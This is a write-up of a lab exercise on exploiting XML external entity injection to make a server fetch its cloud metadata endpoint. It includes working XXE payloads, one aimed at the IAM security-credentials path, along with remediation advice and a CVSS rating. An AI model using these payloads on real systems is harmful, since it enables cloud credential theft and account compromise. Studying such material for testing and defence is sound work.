
# Exploiting XXE to perform SSRF attacks

## Description
The application is vulnerable to XML External Entity (XXE) Injection, allowing attackers to perform Server-Side Request Forgery (SSRF). By defining an external entity that references internal resources, the server fetches and returns the requested content, potentially exposing sensitive cloud metadata and credentials.

## Steps to Exploit
1. Navigate to a product page and click **Check Stock**.
2. Intercept the POST request using Burp Suite.
3. Inject a `DOCTYPE` declaration containing an external entity that references an internal metadata endpoint.
4. Reference the entity within the `productId` field.
5. Forward the request and observe the response.
6. Continue enumerating available metadata paths.
7. Retrieve the IAM role name.
8. Request the role-specific endpoint to obtain cloud credentials.

## Proof of Concept

### Initial Payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://169.254.169.254/">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

### Response
```text
latest
```

### Final Payload
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
```

### Final Response
```text
IAM credentials, access tokens, and secret keys returned.
```

## Impact
- Server-Side Request Forgery (SSRF) against internal services.
- Exposure of cloud IAM credentials and access tokens.
- Access to internal APIs and services not publicly accessible.
- Potential cloud account compromise through credential theft.

## Remediation
1. Disable external entity processing in XML parsers.
2. Restrict outbound requests to internal and link-local IP ranges.
3. Implement secure metadata access controls (e.g., IMDSv2).
4. Monitor and alert on suspicious outbound network traffic.

## CVSS Score
**CVSS v3.1: 9.1 (Critical)**

**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

## CVSS Justification
- **Attack Vector:** Network – exploitable remotely through HTTP requests.
- **Attack Complexity:** Low – requires a crafted XML payload.
- **Privileges Required:** None.
- **User Interaction:** None.
- **Confidentiality:** High – sensitive cloud credentials can be disclosed.
- **Integrity:** High – stolen credentials may allow unauthorized resource modification.
- **Availability:** None – no direct impact on service availability demonstrated.